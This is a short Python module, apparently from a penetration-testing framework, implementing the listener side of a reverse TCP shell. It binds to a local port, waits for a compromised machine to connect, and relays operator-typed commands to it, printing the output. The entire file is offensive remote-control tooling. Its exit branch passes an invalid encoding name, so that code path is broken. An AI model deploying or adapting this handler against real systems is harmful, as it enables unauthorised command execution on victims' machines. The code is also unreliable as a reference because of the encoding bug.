#!/usr/bin/env python
# encoding: utf-8
import socket
from core.Option import *
from protocol.tcp.TCPClient import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "python_reverse_tcp",
        "description": "python_reverse_tcp",
        "authors": (
            "demonsec",
        ),
        "references": (
            "www.ggsec.cn "
            "www.secist.com"
        ),
    }
    lhost = IPOption("", "本地监听IP地址")
    lport = PortOption(8080, "本地监听端口")

    def __init__(self):
        self.end_flag = "<"

    def run(self):
        LHOST = self.lhost
        LPORT = self.lport
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((LHOST, LPORT))
        s.listen(1)
        info = '\033[94m[*]\033[0m监听者ip地址 {LOCAL_IP}: {LOCAL_PORT}'.format(LOCAL_IP=LHOST, LOCAL_PORT=LPORT)
        print(info)
        conn, address = s.accept()
        print("\033[92m[+]\033[0m 已连接成功:", address)
        while True:
            control = input("SHELL > ")
            if 'terminate' in control:
                conn.send(control.encode('terminate'))
                conn.close()
                break
            else:
                conn.send(control.encode())
                print(conn.recv(1024).decode("cp850"))
